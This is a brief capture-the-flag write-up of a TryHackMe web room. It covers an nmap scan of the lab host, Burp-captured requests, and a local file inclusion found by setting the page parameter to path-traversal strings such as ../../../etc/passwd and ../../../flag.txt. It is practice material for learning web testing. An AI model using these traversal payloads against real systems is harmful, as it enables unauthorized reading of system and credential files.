Want to hear some lo-fi beats, to relax or study to? We've got you covered!

Task 1

Want to hear some lo-fi beats, to relax or study to? We've got you covered! 

  

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://10.10.35.213](http://10.10.35.213/) and find the flag in the **root of the filesystem.**

  

Check out similar content on TryHackMe:

- [LFI Path Traversal](https://tryhackme.com/r/room/filepathtraversal)
- [File Inclusion](https://tryhackme.com/room/fileinc)

**Note:** The web page does load some elements from external sources. However, they do not interfere with the completion of the room.

Answer the questions below

Climb the filesystem to find the flag!

## Tools i used

1. nmap to scan target ip..i got firewall block so i used this..i fixed it later
```nmap -Pn 10.10.35.213```
2. burpsuit to capture web requests and modify and send them back
# STEPS_

first i used nmap scan and i got this results
```Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 01:06 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 28.97% done; ETC: 01:07 (0:00:07 remaining)
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.40% done; ETC: 01:07 (0:00:28 remaining)
Nmap scan report for 10.10.35.213
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds

```
next i visited website to see it. and then i capture http and web requests by burpsuit and i found this
```GET /?search=ls HTTP/1.1

GET /?page=relax.php HTTP/1.1
Host: 10.10.35.213
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.35.213/?search=ls
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

i did small changes to see is there any hidden dir files..o change this part to various things like (../../../etc/passwd ../../../../../../etc/passwd)

```GET /?page===**relax.php**== HTTP/1.1```

and i found its vulnerable to ../../../etc/passwd.so i tried next ../../../flag.txt and found flag


## WHAT I LEARNED-

its important to think slow...from zero without going all the way hard methods 